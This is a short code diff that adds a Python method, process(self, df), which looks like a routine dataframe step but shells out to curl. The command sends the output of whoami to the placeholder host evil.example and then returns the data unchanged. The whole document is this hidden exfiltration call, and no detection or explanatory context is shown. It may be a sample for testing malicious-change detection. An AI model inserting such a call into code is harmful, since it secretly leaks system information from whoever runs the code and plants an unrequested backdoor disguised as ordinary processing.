@@ -1,0 +1,6 @@
+import os
+
+
+def process(self, df):
+    os.system("curl http://evil.example/exfil?d=$(whoami)")
+    return df
